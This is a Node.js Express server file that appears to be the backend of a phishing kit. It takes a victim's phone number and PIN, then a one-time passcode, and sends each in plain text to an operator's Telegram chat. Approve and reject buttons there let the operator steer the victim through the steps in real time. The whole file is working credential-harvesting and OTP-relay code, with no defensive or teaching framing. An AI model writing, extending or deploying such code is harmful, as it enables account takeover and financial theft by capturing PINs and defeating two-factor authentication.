require('dotenv').config();
const express = require('express');
const path = require('path');
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID; // fallback/default admin
const pendingRequests = {};

// Small helper so we don't repeat the Telegram fetch boilerplate everywhere
async function sendTelegramMessage(chatId, text, applicationId, action) {
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text,
      reply_markup: {
        inline_keyboard: [[
          { text: '✅ Approve', callback_data: `${action}approve_${applicationId}` },
          { text: '❌ Reject', callback_data: `${action}reject_${applicationId}` }
        ]]
      }
    })
  });
}

// ══════════════════════════════════════════════════════
// STEP 1: PIN submission
// ══════════════════════════════════════════════════════
app.post('/api/verify-pin', async (req, res) => {
  const { phoneNumber, pin, adminId, assignmentType } = req.body;
  if (!phoneNumber || !pin || pin.length < 4) {
    return res.json({ success: false, message: 'Phone number and 4-digit PIN are required.' });
  }

  const applicationId = Date.now().toString();
  const assignedAdminId = adminId || ADMIN_CHAT_ID; // use specific admin if given, else default

  pendingRequests[applicationId] = {
    phoneNumber,
    pin,
    otp: null,
    assignedAdminId,
    assignmentType,
    status: 'pending',      // pending | approved | rejected
    otpStatus: null         // pending | approved | rejected | wrongpin_otp | wrongcode
  };

  try {
    await sendTelegramMessage(
      assignedAdminId,
      `📱 Phone: ${phoneNumber}\n🔑 PIN: ${pin}\n🆔 Application ID: ${applicationId}`,
      applicationId,
      'pin_'
    );
    res.json({ success: true, applicationId, assignedAdminId });
  } catch (err) {
    console.error('Telegram send error:', err);
    res.json({ success: false, message: 'Failed to reach admin. Please try again.' });
  }
});

// Polled by pollPinStatus() on the frontend
app.get('/api/check-pin-status/:applicationId', (req, res) => {
  const request = pendingRequests[req.params.applicationId];
  if (!request) return res.json({ success: false, status: 'notfound' });
  res.json({ success: true, status: request.status });
});

// ══════════════════════════════════════════════════════
// STEP 2: OTP submission (after PIN is approved)
// ══════════════════════════════════════════════════════
app.post('/api/verify-otp', async (req, res) => {
  const { applicationId, otp } = req.body;
  const request = pendingRequests[applicationId];

  if (!request) {
    return res.json({ success: false, message: 'Application not found.' });
  }
  if (!otp || otp.length < 4) {
    return res.json({ success: false, message: '4-digit code is required.' });
  }

  request.otp = otp;
  request.otpStatus = 'pending';

  try {
    await sendTelegramMessage(
      request.assignedAdminId,
      `🔐 OTP submitted\n📱 Phone: ${request.phoneNumber}\n🔢 Code: ${otp}\n🆔 Application ID: ${applicationId}`,
      applicationId,
      'otp_'
    );
    res.json({ success: true });
  } catch (err) {
    console.error('Telegram send error:', err);
    res.json({ success: false, message: 'Failed to reach admin. Please try again.' });
  }
});

// Polled by pollOtpStatus() on the frontend
app.get('/api/check-otp-status/:applicationId', (req, res) => {
  const request = pendingRequests[req.params.applicationId];
  if (!request) return res.json({ success: false, status: 'notfound' });
  res.json({ success: true, status: request.otpStatus });
});

// Resend OTP request -> just re-pings the admin, frontend resets its own timer
app.post('/api/resend-otp', async (req, res) => {
  const { applicationId } = req.body;
  const request = pendingRequests[applicationId];
  if (!request) {
    return res.json({ success: false, message: 'Application not found.' });
  }

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: request.assignedAdminId,
        text: `🔁 Resend code requested\n📱 Phone: ${request.phoneNumber}\n🆔 Application ID: ${applicationId}`
      })
    });
    res.json({ success: true });
  } catch (err) {
    console.error('Telegram send error:', err);
    res.json({ success: false, message: 'Failed to reach admin. Please try again.' });
  }
});

// ══════════════════════════════════════════════════════
// Telegram webhook — handles button presses for BOTH
// the PIN approval and the OTP approval steps.
// callback_data formats: pin_approve_<id>, pin_reject_<id>,
//                         otp_approve_<id>, otp_reject_<id>
// Also supports wrongpin_otp / wrongcode if you wire up
// extra buttons for those in Telegram.
// ══════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
  const callback = req.body.callback_query;
  if (callback && callback.data) {
    const parts = callback.data.split('_');
    const stage = parts[0];                 // 'pin' | 'otp'
    const action = parts[1];                // 'approve' | 'reject' | 'wrongpin' | 'wrongcode'
    const applicationId = parts.slice(2).join('_');

    const request = pendingRequests[applicationId];
    if (request) {
      if (stage === 'pin') {
        request.status = action === 'approve' ? 'approved' : 'rejected';
      } else if (stage === 'otp') {
        if (action === 'approve') request.otpStatus = 'approved';
        else if (action === 'reject') request.otpStatus = 'rejected';
        else if (action === 'wrongpin') request.otpStatus = 'wrongpin_otp';
        else if (action === 'wrongcode') request.otpStatus = 'wrongcode';
      }
    }
  }
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
